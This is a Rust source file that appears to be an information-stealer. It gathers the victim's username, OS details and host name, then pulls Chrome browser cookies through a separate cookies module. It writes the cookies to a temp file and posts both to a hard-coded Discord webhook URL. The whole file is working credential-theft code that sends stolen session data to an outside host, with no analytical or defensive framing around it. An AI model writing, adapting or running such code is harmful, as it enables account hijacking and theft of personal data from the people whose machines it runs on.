use anyhow::Result; 
use serenity::{http::Http, model::{channel::{Embed,AttachmentType},webhook::Webhook}};
use sysinfo::{System, SystemExt};
use std::{env, fs, path::PathBuf};
mod cookies;

#[tokio::main]
async fn main(){
    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!("Username:                {}\n", env::var_os("USERNAME").unwrap().into_string().unwrap()));
    sysinfo.push_str(&format!("System name:             {}\n", unwrap_string(sys.name())));
    sysinfo.push_str(&format!("System OS version:       {}\n", unwrap_string(sys.os_version())));
    sysinfo.push_str(&format!("System host name:        {}\n", unwrap_string(sys.host_name())));

    let file = env::temp_dir().join("cookies.txt");
    let chrome_cookies = cookies::get_cookies().unwrap();
    fs::write(&file, chrome_cookies.join("\n")).unwrap();
    send(sysinfo, file).await;
}

fn unwrap_string(info: Option<String>) -> String{
    match info {
        Some(s) => s,
        None => "?".to_string(),
    }
}

async fn send(data: String, file: PathBuf) -> Result<()>{
    let http = Http::new("token");

    let url = "https://discord.com/api/webhooks/1105833038648189028/bxqCh8d4ptvleFfvZyRz80Wtf161_-KDBoGbPXeYEo-4UJOI5cUEbQS156GSX419JM6u";
    let webhook = Webhook::from_url(&http, url).await?;

    let embed = Embed::fake(|e| {
    e.title("System info");
    e.description(
        data,
    );
    e
});
    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username")
                .embeds(vec![embed])
                .add_file(AttachmentType::Path(&file))
        })
        .await?;
    Ok(())
}
